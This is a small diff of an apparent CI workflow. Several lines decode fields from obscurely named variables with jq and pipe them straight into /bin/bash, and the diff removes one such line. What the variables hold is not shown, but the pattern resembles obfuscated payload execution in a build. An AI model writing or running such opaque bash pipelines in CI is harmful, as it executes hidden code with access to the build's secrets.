@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$iy4" | jq -r .fsor4596 | /bin/bash
           echo $ysgdr97 | jq -r .kh7 | /bin/bash
           echo $azc715 | jq -r .o1800 | /bin/bash
-          echo $z7 | jq -r .epfz8 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
